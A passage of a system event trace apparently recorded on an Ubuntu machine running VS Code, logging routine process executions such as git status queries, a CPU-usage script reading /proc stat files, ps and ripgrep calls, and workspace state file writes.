+EXEC|execve|5861011639727|9565|9552|1000|cpuUsage.sh|cat /proc/6456/stat
+EXEC|execve|5861013411457|9567|9552|1000|cpuUsage.sh|cat /proc/8943/stat
+EXEC|execve|5861015039674|9569|9552|1000|cpuUsage.sh|cat /proc/6463/stat
+EXEC|execve|5861016712761|9571|9552|1000|cpuUsage.sh|cat /proc/9014/stat
+EXEC|execve|5861018526534|9573|9552|1000|cpuUsage.sh|cat /proc/6464/stat
+EXEC|execve|5861020184552|9575|9552|1000|cpuUsage.sh|cat /proc/9015/stat
+CLONE|9578|5774|5865755500711
+EXEC|execve|5865756130825|9578|5774|1000|code|git config --get commit.template
+EXEC|execve|5865768970398|9579|5774|1000|code|git for-each-ref --format=%(refname)%00%(upstream:short)%00%(objectname)%00%(upstream:track)%00%(upstream:remotename)%00%(upstream:remoteref) refs/heads/main refs/remotes/main
+EXEC|execve|5865781999750|9580|5774|1000|code|git status -z -uall
+EXEC|execve|5865791901379|9581|5774|1000|code|git for-each-ref --sort -committerdate --format %(refname)%00%(objectname)%00%(*objectname)
+CLONE|9582|5774|5866118775457
+EXEC|execve|5866119508127|9582|5774|1000|code|git check-ignore -v -z --stdin
+CLONE|27|5733|5866151618023
+FILE_CREATE|1000|5638|0|0|/home/ubuntu/.config/Code/User/workspaceStorage/f85555962383b248c2a7b7b6a29da9db/state.vscdb-journal|libuv-worker
+CLONE|9584|5872|5870387293809
+FILE_CREATE|1000|5638|0|0|/home/ubuntu/.config/Code/User/globalStorage/state.vscdb-journal|libuv-worker
+CLONE|9585|5774|5870809998082
+EXEC|execve|5870810509545|9585|5774|1000|code|git config --get commit.template
+EXEC|execve|5870816616928|9586|5774|1000|code|git for-each-ref --format=%(refname)%00%(upstream:short)%00%(objectname)%00%(upstream:track)%00%(upstream:remotename)%00%(upstream:remoteref) refs/heads/main refs/remotes/main
+EXEC|execve|5870823118517|9587|5774|1000|code|git status -z -uall
+EXEC|execve|5870827679866|9588|5774|1000|code|git for-each-ref --sort -committerdate --format %(refname)%00%(objectname)%00%(*objectname)
+CLONE|9589|5774|5871138618107
+EXEC|execve|5871139073343|9589|5774|1000|code|git check-ignore -v -z --stdin
+CLONE|28|5733|5871177871822
+CLONE|9591|5761|5871388770407
+EXEC|execve|5871388992365|9591|5761|1000|code|/bin/sh -c which ps
+EXEC|execve|5871390824961|9592|9591|1000|sh|which ps
+EXEC|execve|5871393712002|9593|5761|1000|code|/bin/sh -c /usr/bin/ps -ax -o pid=,ppid=,pcpu=,pmem=,command=
+EXEC|execve|5871395251956|9594|9593|1000|sh|/usr/bin/ps -ax -o pid=,ppid=,pcpu=,pmem=,command=
+EXEC|execve|5871412754727|9595|5761|1000|code|/bin/sh -c "/usr/share/code/resources/app/out/vs/base/node/cpuUsage.sh" 5872 6456 8943 6463 9014 6464 9015
+EXEC|execve|5871414537631|9596|9595|1000|sh|/usr/share/code/resources/app/out/vs/base/node/cpuUsage.sh 5872 6456 8943 6463 9014 6464 9015
+EXEC|execve|5871416307012|9597|9596|1000|cpuUsage.sh|sed -n s/^cpu\s//p /proc/stat
+EXEC|execve|5871419453362|9598|9596|1000|cpuUsage.sh|cat /proc/5872/stat
+EXEC|execve|5871421584713|9599|9596|1000|cpuUsage.sh|cat /proc/6456/stat
+EXEC|execve|5871423487464|9600|9596|1000|cpuUsage.sh|cat /proc/8943/stat
+EXEC|execve|5871425192106|9601|9596|1000|cpuUsage.sh|cat /proc/6463/stat
+EXEC|execve|5871427582884|9602|9596|1000|cpuUsage.sh|cat /proc/9014/stat
+EXEC|execve|5871429053366|9603|9596|1000|cpuUsage.sh|cat /proc/6464/stat
+EXEC|execve|5871430719984|9604|9596|1000|cpuUsage.sh|cat /proc/9015/stat
+EXEC|execve|5871432388624|9605|9596|1000|cpuUsage.sh|sleep 1
+CLONE|9606|9596|5872434198372
+EXEC|execve|5872434477379|9606|9596|1000|cpuUsage.sh|sed -n s/^cpu\s//p /proc/stat
+EXEC|execve|5872436293986|9607|9596|1000|cpuUsage.sh|cat /proc/5872/stat
+EXEC|execve|5872438570826|9609|9596|1000|cpuUsage.sh|cat /proc/6456/stat
+EXEC|execve|5872440496027|9611|9596|1000|cpuUsage.sh|cat /proc/8943/stat
+EXEC|execve|5872442226686|9613|9596|1000|cpuUsage.sh|cat /proc/6463/stat
+EXEC|execve|5872443906661|9615|9596|1000|cpuUsage.sh|cat /proc/9014/stat
+EXEC|execve|5872445569805|9617|9596|1000|cpuUsage.sh|cat /proc/6464/stat
+EXEC|execve|5872447835519|9619|9596|1000|cpuUsage.sh|cat /proc/9015/stat
+FILE_CREATE|1000|5638|0|0|/home/ubuntu/.config/Code/User/workspaceStorage/f85555962383b248c2a7b7b6a29da9db/chatEditingSessions/0d1f1cf5-bd31-4bbe-8828-56832b0f390f/state.json|libuv-worker
+FILE_CREATE|1000|5638|0|0|/home/ubuntu/.config/Code/User/workspaceStorage/f85555962383b248c2a7b7b6a29da9db/state.vscdb-journal|libuv-worker
+EXEC|execve|5874140135110|9623|5774|1000|code|/usr/share/code/resources/app/node_modules/@vscode/ripgrep/bin/rg --files --hidden --case-sensitive --no-require-git -g !**/.git -g !**/.svn -g !**/.hg -g !**/.DS_Store -g !**/Thumbs.db -g !**/node_modules -g !**/bower_components -g
+CLONE|9623|5774|5874139673880
+EXEC|execve|5874197020742|9629|5774|1000|code|/usr/share/code/resources/app/node_modules/@vscode/ripgrep/bin/rg --files --hidden --case-sensitive --no-require-git -g !**/.git -g !**/.svn -g !**/.hg -g !**/.DS_Store -g !**/Thumbs.db -g !**/node_modules -g !**/bower_components -g
